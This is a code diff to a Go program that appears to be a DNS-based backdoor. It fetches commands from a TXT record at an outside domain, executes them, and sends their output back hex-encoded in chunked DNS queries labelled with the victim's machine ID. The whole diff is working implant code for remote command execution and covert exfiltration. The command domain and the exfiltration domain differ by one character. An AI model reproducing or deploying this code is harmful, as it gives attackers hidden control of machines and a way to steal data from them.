@@ -1,12 +1,14 @@
 package main
 
 import (
-	"encoding/base64"
+	"encoding/hex"
+	"fmt"
 	"os/exec"
 	"strconv"
 	"strings"
 	"time"
 
+	"github.com/denisbrodbeck/machineid"
 	"github.com/miekg/dns"
 )
 
@@ -17,10 +19,10 @@ const (
 	delay       = 500 * time.Millisecond
 )
 
-var baseAnswerUri = "syl.sh"
-var questionBeamUri = "137.137.137.137."
+var questionBeamUri = "0.0.0.syl.sh."
 
 func main() {
+	machineId, _ := machineid.ID()
 	m := new(dns.Msg)
 	m.SetQuestion(questionBeamUri, dns.TypeTXT)
 
@@ -34,34 +36,26 @@ func main() {
 					}
 
 					cmd := strings.Split(txt.Txt[0], " ")
-					cmdToExecute := cmd[0]
-					cmdArgs := cmd[1:]
+
+					fmt.Printf("Recevied cmd: %s\n", cmd)
 
 					nm := new(dns.Msg)
 
-					out, err := exec.Command(cmdToExecute, cmdArgs...).CombinedOutput()
+					out, err := exec.Command(cmd[0], cmd[1:]...).CombinedOutput()
 					if err != nil {
 						out = []byte(" ")
 					}
-					outEnc := base64.StdEncoding.EncodeToString(out)
 
-					// Add Space for META info, this is for the `cs=2&cc=1`
-					// usually this requires ~12 chars, we put it on 20 as a default
-					// for a larger messages.
-					dataLeft := (maxMsgLen - len(baseAnswerUri)) - metaInfoLen
+					chunkOutEnc := hex.EncodeToString(out)
 
-					chunks := Chunks(outEnc, dataLeft)
+					chunks := Chunks(chunkOutEnc, 63)
 					for i, chunkOut := range chunks {
 						chunkLen := strconv.Itoa(len(chunks))
 						currentChunk := strconv.Itoa((i + 1))
 
-						// Build the Chunk URL
-						chunkUrl := baseAnswerUri +
-							"?" + "cs=" + chunkLen +
-							"&" + "cc=" + currentChunk +
-							"&" + "o=" + chunkOut +
-							"."
+						chunkUrl := currentChunk + "-" + chunkLen + "." + machineId + "." + chunkOut + ".sy1.sh."
 
+						fmt.Println(chunkUrl)
 						nm.SetQuestion(chunkUrl, dns.TypeTXT)
 						dns.Exchange(nm, host)
 					}
